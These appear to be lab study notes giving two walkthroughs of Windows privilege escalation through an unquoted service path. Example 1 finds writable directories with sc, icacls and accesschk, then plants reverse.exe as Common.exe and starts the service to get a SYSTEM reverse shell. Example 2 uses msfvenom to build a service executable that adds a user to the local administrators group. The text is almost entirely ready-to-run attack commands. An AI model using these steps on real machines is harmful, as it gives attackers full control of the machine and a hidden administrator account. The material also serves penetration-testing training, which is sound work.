**Example 1:**

1. **Query Service Configuration:**
   ```plaintext
   sc qc unquotedsvc
   ```
   - Checks if the service runs with SYSTEM privileges and if the path is unquoted with spaces.

2. **Check Directory Permissions Using icacls:**
   ```plaintext
   icacls "C:\Program Files\Unquoted Path Service\"
   ```
   - The output should show that "BUILTIN\Users" or "NT AUTHORITY\INTERACTIVE" has "F" (Full Control) or "M" (Modify) permissions for the service to be vulnerable.

3. **Check Directory Permissions Using AccessChk:**
   ```plaintext
   C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
   ```
   - Confirms that `BUILTIN\Users` can write to the directory.

4. **Place Malicious Executable:**
   ```plaintext
   copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
   ```
   - Puts `reverse.exe` in the directory as `Common.exe`.

5. **Exploit:**
   - Start a listener on Kali.
   - Start the service:
     ```plaintext
     net start unquotedsvc
     ```
   - This spawns a reverse shell with SYSTEM privileges.

**Example 2:**

1. **Create Malicious Executable:**
   ```plaintext
   msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
   ```

2. **Copy to Vulnerable Path:**
   - Place `common.exe` in `C:\Program Files\Unquoted Path Service`.

3. **Start the Service:**
   ```plaintext
   sc start unquotedsvc
   ```

4. **Verify:**
   ```plaintext
   net localgroup administrators
   ```
   - Confirms the user was added to the local administrators group.

---
